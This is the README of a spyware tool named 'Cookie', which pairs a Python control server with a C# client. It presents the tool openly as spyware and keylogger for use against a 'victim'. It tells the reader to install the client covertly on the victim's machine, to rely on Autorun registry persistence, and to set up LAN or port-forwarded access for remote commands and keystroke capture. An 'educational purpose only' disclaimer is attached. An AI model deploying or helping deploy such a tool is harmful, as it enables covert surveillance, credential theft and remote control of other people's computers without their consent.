# __Cookie__:cookie:
![Version](https://img.shields.io/badge/Version-01.02-brightgreen)
![Author](https://img.shields.io/badge/Author-Caleb-blue)
![Language](https://img.shields.io/badge/Language-python-orange)
![Language](https://img.shields.io/badge/Language-Cs-orange)
![License](https://img.shields.io/badge/License-MIT-red)

## Description

Cookie is a Spyware created for educationl purpose only so use this only in a protected and authorized environment.

### Purpose

It's a spyware so... spy! It can send all sorts of commands to the pc victim, and it is also a __keylogger__ so it can read what the victim is typing on his keyboard.

---

### Instructions

- The Cookie Server is the python script, this is the script that you have to use for controlling the victim machine;

You can use it on your mobile phone (use QPython) or in your computers. You have to set only the IP, the victim has to be in your LAN or you have to use a forward port. The default port is [7373]

- The Cookie Client is the C# service; You have to change the IP and the default port to your ip:

```c#
cookie.Connect("127.0.0.1",7373);
```

You must install it on victim machine and in some way (there are a lot of ways) start it, then it writes it self in the Autorun registry.
Then it will search for Cookie Server.

---

Made by [Caleb Gucciardi](https://github.com/d0gs3c)
|
Edited by [Chiara Sabaini](https://www.github.com/chiarasabaini)
